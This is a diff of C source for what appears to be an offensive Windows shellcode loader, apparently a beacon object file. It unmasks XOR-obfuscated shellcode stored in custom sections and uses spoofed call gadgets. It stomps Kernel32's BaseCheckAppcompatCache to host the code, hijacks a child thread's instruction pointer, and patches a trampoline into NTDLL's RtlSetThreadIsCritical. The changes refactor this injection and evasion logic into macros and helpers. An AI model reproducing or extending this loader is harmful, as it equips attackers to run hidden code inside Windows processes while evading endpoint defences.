@@ -6,22 +6,19 @@
 #include "dfr.h"
 #include "shellwriter.h"
 #include "spoof.h"
+#include "resource.h"
 
-#define GETRESOURCE(x) (char *)&x
-#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
-
-typedef struct
-{
-    int length;
-    char value[];
-} RESOURCE;
+#define SCW_STOMP_MODULE "Kernel32.dll"
+#define SCW_STOMP_FUNC "BaseCheckAppcompatCache"
+#define TRAMPOLINE_TARGET_FN (u64) NTDLL$RtlSetThreadIsCritical;
 
 char __SC__[0] __attribute__((section("sc")));
 char __MASK__[0] __attribute__((section("mask")));
 
 void go()
 {
-    dprintf("[+] go() loader running\n");
+    dprintf("[+] === START LOADER go()===\n");
+
 
     init_spoof();
     dprintf("[+] gadget=0x%llx\n", g_ctx.gadget);
@@ -31,23 +28,21 @@ void go()
     RESOURCE *mask_key = (RESOURCE *)GETRESOURCE(__MASK__);
 
     char unmasked_sc[masked_sc->length];
-    for (int i = 0; i < masked_sc->length; i++)
-        unmasked_sc[i] = masked_sc->value[i] ^ mask_key->value[i % mask_key->length];
+    resource_unmask(masked_sc, mask_key, (u8 *)unmasked_sc);
 
     /* ── Build ShellCodeWriter stub ────────────────────────────────── */
-    u8 stub[SCW_BUF_LARGE];
+    u8 stub[SCW_STUB_SIZE(masked_sc->length)];
     int _i;
-    for (_i = 0; _i < SCW_BUF_LARGE; _i++)
+    for (_i = 0; _i < SCW_STUB_SIZE(masked_sc->length); _i++)
         stub[_i] = 0;
 
     SCW w;
     scw_init(&w, stub, sizeof(stub));
-    // scw_load_and_call(&w,(u64)KERNEL32$VirtualAlloc,(u64)KERNEL32$VirtualProtect, (const u8 *)unmasked_sc, masked_sc->length);
-    /* TO DO: select a better module and fn for stomping */
+    // OLD IMPL: scw_load_and_call(&w,(u64)KERNEL32$VirtualAlloc,(u64)KERNEL32$VirtualProtect, (const u8 *)unmasked_sc, masked_sc->length);
     scw_stomp_and_call(&w,
                        (u64)KERNEL32$VirtualProtect,
-                       "kernel32.dll",
-                       "BaseCheckAppcompatCache",
+                       SCW_STOMP_MODULE,
+                       SCW_STOMP_FUNC,
                        (const u8 *)unmasked_sc, masked_sc->length);
 
     dprintf("[+] stub: %d bytes, nulls: %s\n",
@@ -187,8 +182,6 @@ void go()
     }
 
     /* ── Hijack child thread RIP → shellcode ───────────────────────── */
-    // static CONTEXT ctx_storage;
-    // CONTEXT *ctx = &ctx_storage;
     __attribute__((aligned(16))) CONTEXT ctx_storage = {0};
     CONTEXT *ctx = &ctx_storage;
     for (int _z = 0; _z < (int)sizeof(CONTEXT); _z++)
@@ -217,7 +210,7 @@ void go()
     *(u64 *)(trampoline + 6) = (u64)shellcode;
 
     /* ── Find target function in child (same base as parent) ───────── */
-    u64 target_fn = (u64)NTDLL$RtlSetThreadIsCritical;
+    u64 target_fn = TRAMPOLINE_TARGET_FN;
 
     /* ── Make target function writable in child ────────────────────── */
     PVOID tramp_base = (PVOID)(target_fn & ~(4096 - 1));
